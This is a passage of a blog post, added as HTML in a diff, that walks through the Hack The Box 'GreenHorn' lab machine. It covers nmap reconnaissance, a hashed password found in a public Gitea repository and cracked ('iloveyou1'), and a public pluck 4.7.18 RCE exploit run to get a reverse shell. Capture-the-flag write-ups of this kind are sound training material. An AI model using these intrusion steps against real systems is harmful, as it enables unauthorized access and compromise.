@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://foued-saidi.tech/2024/12/06/hackthebox-greenhorn/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewGreenHorn is an easy-difficulty machine from Hack The Box dealing initially with an exposed Gitea instance on port 3000 leading to an exposed hashed password which we can easily crack and perf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: GreenHorn">
+<meta property="og:url" content="http://foued-saidi.tech/2024/12/06/Hackthebox-GreenHorn/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewGreenHorn is an easy-difficulty machine from Hack The Box dealing initially with an exposed Gitea instance on port 3000 leading to an exposed hashed password which we can easily crack and perf">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/GreenHorn/GreenHorn.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/GreenHorn/gitea.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/GreenHorn/gitea1.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/GreenHorn/gitea2.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/GreenHorn/gitea3.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/GreenHorn/web.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/GreenHorn/blurry.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/GreenHorn/password.png">
+<meta property="article:published_time" content="2024-12-06T10:04:05.000Z">
+<meta property="article:modified_time" content="2024-12-07T08:06:29.242Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/GreenHorn/GreenHorn.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: GreenHorn -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"foued-saidi.tech","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: GreenHorn</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-12-06 11:04:05</span>
+        <span class="mobile">2024-12-06 11:04:05</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-12-07 09:06:29</span>
+            <span class="mobile">2024-12-07 09:06:29</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>GreenHorn is an easy-difficulty machine from Hack The Box dealing initially with an exposed Gitea instance on port 3000 leading to an exposed hashed password which we can easily crack and perform a known Remote Code Execution exploit on pluck version 4.7.18 to land a shell. Later reusing same credentials to pivot to a new user and and our user flag. And finally a kindof CTFy challenge where we’ll be un-blurring a blurred password inside of PDF file using Depix to get our root flag. A bit fun and CTFy.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/GreenHorn/GreenHorn.png"
+                      alt="GreenHorn-info-card"
+                ><figcaption>GreenHorn-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">243.215</span> <span class="literal">--unprivileged</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">17</span> W. Central Africa Standard Time</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">243.215</span></span><br><span class="line">Host is up (<span class="number">0.47</span>s latency).</span><br><span class="line">Not shown: <span class="number">997</span> filtered tcp ports (no<span class="literal">-response</span>)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp   open  ssh     OpenSSH <span class="number">8.9</span>p1 Ubuntu <span class="number">3</span>ubuntu0.<span class="number">10</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">256</span> <span class="number">57</span>:d6:<span class="number">92</span>:<span class="number">8</span>a:<span class="number">72</span>:<span class="number">44</span>:<span class="number">84</span>:<span class="number">17</span>:<span class="number">29</span>:eb:<span class="number">5</span>c:c9:<span class="number">63</span>:<span class="number">6</span>a:fe:fd (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">40</span>:ea:<span class="number">17</span>:b1:b6:c5:<span class="number">3</span>f:<span class="number">42</span>:<span class="number">56</span>:<span class="number">67</span>:<span class="number">4</span>a:<span class="number">3</span>c:ee:<span class="number">75</span>:<span class="number">23</span>:<span class="number">2</span>f (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp   open  http    nginx <span class="number">1.18</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line">|_http<span class="literal">-title</span>: Did not follow redirect to http://greenhorn.htb/</span><br><span class="line">|_http<span class="literal">-server-header</span>: nginx/<span class="number">1.18</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line"><span class="number">3000</span>/tcp open  http    Golang net/http server</span><br><span class="line">| fingerprint<span class="literal">-strings</span>:</span><br><span class="line">|   GenericLines, Help, RTSPRequest:</span><br><span class="line">|     HTTP/<span class="number">1.1</span> <span class="number">400</span> Bad Request</span><br><span class="line">|     Content<span class="literal">-Type</span>: text/plain; charset=utf<span class="literal">-8</span></span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/<span class="number">1.0</span> <span class="number">200</span> OK</span><br><span class="line">|     Cache<span class="literal">-Control</span>: max<span class="literal">-age</span>=<span class="number">0</span>, private, must<span class="literal">-revalidate</span>, no<span class="literal">-transform</span></span><br><span class="line">|     Content<span class="literal">-Type</span>: text/html; charset=utf<span class="literal">-8</span></span><br><span class="line">|     <span class="built_in">Set-Cookie</span>: i_like_gitea=<span class="number">9</span>f5aa4ec0c774f5b; Path=/; HttpOnly; SameSite=Lax</span><br><span class="line">|     <span class="built_in">Set-Cookie</span>: _csrf=aXOh4QdKFxkpyQqDtbwe<span class="literal">-PZB9II6MTczMzQ4MDYyOTE5OTQzMjE4MQ</span>; Path=/; Max<span class="literal">-Age</span>=<span class="number">86400</span>; HttpOnly; SameSite=Lax</span><br><span class="line">|     X<span class="literal">-Frame-Options</span>: SAMEORIGIN</span><br><span class="line">|     Date: Fri, <span class="number">06</span> Dec <span class="number">2024</span> <span class="number">10</span>:<span class="number">23</span>:<span class="number">49</span> GMT</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=<span class="string">&quot;en-US&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">theme</span>-<span class="title">auto</span>&quot;&gt;</span></span><br><span class="line"><span class="class">|     &lt;<span class="title">head</span>&gt;</span></span><br><span class="line"><span class="class">|     &lt;<span class="title">meta</span> <span class="title">name</span>=&quot;<span class="title">viewport</span>&quot; <span class="title">content</span>=&quot;<span class="title">width</span>=<span class="title">device</span>-<span class="title">width</span>, <span class="title">initial</span>-<span class="title">scale</span>=1&quot;&gt;</span></span><br><span class="line"><span class="class">|     &lt;<span class="title">title</span>&gt;<span class="title">GreenHorn</span>&lt;/<span class="title">title</span>&gt;</span></span><br><span class="line"><span class="class">|     &lt;<span class="title">link</span> <span class="title">rel</span>=&quot;<span class="title">manifest</span>&quot; <span class="title">href</span>=&quot;<span class="title">data</span>:<span class="title">application</span>/<span class="title">json</span>;<span class="title">base64</span>,<span class="title">eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX</span></span></span><br><span class="line"><span class="class">|   <span class="title">HTTPOptions</span>:</span></span><br><span class="line"><span class="class">|     <span class="title">HTTP</span>/1.0 405 <span class="title">Method</span> <span class="title">Not</span> <span class="title">Allowed</span></span></span><br><span class="line"><span class="class">|     <span class="title">Allow</span>: <span class="title">HEAD</span></span></span><br><span class="line"><span class="class">|     <span class="title">Allow</span>: <span class="title">GET</span></span></span><br><span class="line"><span class="class">|     <span class="title">Cache</span>-<span class="title">Control</span>: <span class="title">max</span>-<span class="title">age</span>=0, <span class="title">private</span>, <span class="title">must</span>-<span class="title">revalidate</span>, <span class="title">no</span>-<span class="title">transform</span></span></span><br><span class="line"><span class="class">|     <span class="title">Set</span>-<span class="title">Cookie</span>: <span class="title">i_like_gitea</span>=37743110979<span class="title">ab7c9</span>; <span class="title">Path</span>=/; <span class="title">HttpOnly</span>; <span class="title">SameSite</span>=<span class="title">Lax</span></span></span><br><span class="line"><span class="class">|     <span class="title">Set</span>-<span class="title">Cookie</span>: _<span class="title">csrf</span>=2<span class="title">mURmA5eek0cP98R8m5XcKO9Ryk6MTczMzQ4MDYzMDgwNjIxMTkwNg</span>; <span class="title">Path</span>=/; <span class="title">Max</span>-<span class="title">Age</span>=86400; <span class="title">HttpOnly</span>; <span class="title">SameSite</span>=<span class="title">Lax</span></span></span><br><span class="line"><span class="class">|     <span class="title">X</span>-<span class="title">Frame</span>-<span class="title">Options</span>: <span class="title">SAMEORIGIN</span></span></span><br><span class="line"><span class="class">|     <span class="title">Date</span>: <span class="title">Fri</span>, 06 <span class="title">Dec</span> 2024 10:23:50 <span class="title">GMT</span></span></span><br><span class="line"><span class="class">|_    <span class="title">Content</span>-<span class="title">Length</span>: 0</span></span><br><span class="line"><span class="class">|_<span class="title">http</span>-<span class="title">title</span>: <span class="title">GreenHorn</span></span></span><br><span class="line"><span class="class">1 <span class="title">service</span> <span class="title">unrecognized</span> <span class="title">despite</span> <span class="title">returning</span> <span class="title">data</span>. <span class="title">If</span> <span class="title">you</span> <span class="title">know</span> <span class="title">the</span> <span class="title">service</span>/<span class="title">version</span>, <span class="title">please</span> <span class="title">submit</span> <span class="title">the</span> <span class="title">following</span> <span class="title">fingerprint</span> <span class="title">at</span> <span class="title">https</span>://<span class="title">nmap</span>.<span class="title">org</span>/<span class="title">cgi</span>-<span class="title">bin</span>/<span class="title">submit</span>.<span class="title">cgi</span>?<span class="title">new</span>-<span class="title">service</span> :</span></span><br><span class="line"><span class="class">&lt;<span class="title">snip</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">Service</span> <span class="title">Info</span>: <span class="title">OS</span>: <span class="title">Linux</span>; <span class="title">CPE</span>: <span class="title">cpe</span>:/<span class="title">o</span>:<span class="title">linux</span>:<span class="title">linux_kernel</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">Service</span> <span class="title">detection</span> <span class="title">performed</span>. <span class="title">Please</span> <span class="title">report</span> <span class="title">any</span> <span class="title">incorrect</span> <span class="title">results</span> <span class="title">at</span> <span class="title">https</span>://<span class="title">nmap</span>.<span class="title">org</span>/<span class="title">submit</span>/ .</span></span><br><span class="line"><span class="class"><span class="title">Nmap</span> <span class="title">done</span>: 1 <span class="title">IP</span> <span class="title">address</span> (1 <span class="title">host</span> <span class="title">up</span>) <span class="title">scanned</span> <span class="title">in</span> 96.94 <span class="title">seconds</span></span></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have 3 open ports: ssh, http that’s redirecting us to <code>greenhorn.htb</code> so we can add that to our <code>/etc/hosts</code> and a port 3000 that’s a <code>gitea</code> instance ( we can tell from the cookie name).</p>
+<h3 id="Web-Application-http-greenhorn-htb-3000-Gitea"><a href="#Web-Application-http-greenhorn-htb-3000-Gitea" class="headerlink" title="Web Application - http://greenhorn.htb:3000 - Gitea"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://greenhorn.htb:3000/" >http://greenhorn.htb:3000 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - Gitea</h3><p>Navigating to the <code>Gitea</code> portal we can normally create an account without any admin approval:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/GreenHorn/gitea.png"
+                      alt="Gitea"
+                ><figcaption>Gitea</figcaption></figure></p>
+<p>We can then explore what this gitea instance holds for us:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/GreenHorn/gitea1.png"
+                      alt="Gitea"
+                ><figcaption>Gitea</figcaption></figure></p>
+<p>We find a <code>GreenHorn</code> repo under <a class="link"   target="_blank" rel="noopener" href="http://greenhorn.htb:3000/GreenAdmin/GreenHorn" >http://greenhorn.htb:3000/GreenAdmin/GreenHorn <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> that I guess holds the source code of the main http web app. I could go on and start doing some source code analysis, but I just relied on the lack of experience of the web developer (in the hacking context of course) and went to search for exposed creds, and BOOM:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/GreenHorn/gitea2.png"
+                      alt="Gitea"
+                ><figcaption>Gitea</figcaption></figure></p>
+<p>We take this to <a class="link"   target="_blank" rel="noopener" href="https://crackstation.net/" >Crackstation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> without having to launch my kali VM, and I get a hit:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/GreenHorn/gitea3.png"
+                      alt="Gitea"
+                ><figcaption>Gitea</figcaption></figure><br>(Yeah, I love you too!)</p>
+<p>Now what are we gonna do with these creds?</p>
+<h3 id="Web-Application-http-greenhorn-htb-80"><a href="#Web-Application-http-greenhorn-htb-80" class="headerlink" title="Web Application - http://greenhorn.htb:80"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://greenhorn.htb/" >http://greenhorn.htb:80 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/GreenHorn/web.png"
+                      alt="Web Application"
+                ><figcaption>Web Application</figcaption></figure></p>
+<p>It looks like a casual front for the website, however, we could see a <code>powered by pluck</code> message on the footer of the page.<br><a class="link"   target="_blank" rel="noopener" href="https://github.com/pluck-cms/pluck/wiki" >pluck <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> is a CMS, just like wordpress.</p>
+<p>Doing a quick google ninja search for any pluck exploits or CVEs, I stumbled upon <a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/51592" >this pluck v4.7.18 RCE <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> exploit which will only need me to provide it with the creds to be able to execute commands.<br>Let’s supply it with our previously captured creds like this <code>login_payload = &#123;&quot;cont1&quot;: &quot;iloveyou1&quot;,&quot;bogus&quot;: &quot;&quot;,&quot;submit&quot;: &quot;Log in&quot;&#125;</code>, also creating a <code>shell.php</code> script to land a reverse shell on it(I simply used <a class="link"   target="_blank" rel="noopener" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" >this php reverse shell script <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ):</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; python3 .\exploit.py</span><br><span class="line">Login account</span><br><span class="line">ZIP file download.</span><br></pre></td></tr></table></figure></div>
+
+<p>And we get a shell!</p>
